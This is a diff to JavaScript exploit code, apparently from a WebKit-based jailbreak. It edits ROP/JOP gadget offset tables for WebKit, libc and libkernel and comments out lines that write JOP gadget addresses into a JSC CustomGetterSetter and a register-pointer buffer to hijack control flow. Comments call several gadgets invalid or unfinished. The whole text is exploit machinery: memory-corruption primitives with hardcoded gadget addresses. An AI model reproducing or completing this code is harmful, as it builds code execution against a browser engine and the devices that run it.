@@ -426,7 +426,7 @@ let webkit_gadget_offsets = new Map(
     "mov qword ptr [rdi], rax; ret": 0x000000000003a79a, // `48 89 07 c3`
     "mov dword ptr [rdi], eax; ret": 0x000000000003469f, // `89 07 c3`
     // not present in webkit, libc, and libkernel
-    "mov dword ptr [rax], esi; ret": 0x0, // `89 30 c3`
+    // "mov dword ptr [rax], esi; ret": 0x000000000109b1f0, // `89 30 c3`
 
 
     // TODO: none of the JOPs except the last one are valid. Need to learn and find these, potentially rewrite.  
@@ -443,6 +443,8 @@ let webkit_gadget_offsets = new Map(
 
 const libc_gadget_offsets = new Map(
   Object.entries({
+    // This isn't a ROP gadget, but a JOP gadget which jmp to pop registers and return. Doesn't work either
+    // "mov dword ptr [rax], esi; ret": 0x000000000008b498,
     "getcontext": 0x443F4,
     "setcontext": 0x44378,
   }),
@@ -450,6 +452,8 @@ const libc_gadget_offsets = new Map(
 
 const libkernel_gadget_offsets = new Map(
   Object.entries({
+    // This isn't a ROP gadget, but a JOP gadget which jmp to pop registers and return. Doesn't work either
+    // "mov dword ptr [rax], esi; ret": 0x000000000000dda2,
     // returns the location of errno
     "__error": 0x1CF70,
   }),
@@ -563,7 +567,7 @@ export function init(Chain) {
   const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
   mem.cpy(gc_buf, gs, size_cgs);
   // JSC::CustomGetterSetter.m_setter
-  gc_buf.write64(0x10, get_gadget(gadgets, jop1));
+  // gc_buf.write64(0x10, get_gadget(gadgets, jop1));
 
   const proto = Chain.prototype;
   // _rop must have a descriptor initially in order for the structure to pass
@@ -588,10 +592,10 @@ export function init(Chain) {
   const rax_ptrs_p = get_view_vector(rax_ptrs);
   proto._rax_ptrs = rax_ptrs;
 
-  rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
-  rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
-  rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
-  rax_ptrs.write64(0, get_gadget(gadgets, jop5));
+  // rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
+  // rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
+  // rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
+  // rax_ptrs.write64(0, get_gadget(gadgets, jop5));
 
   const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
   jop_buffer_p.write64(0, rax_ptrs_p);
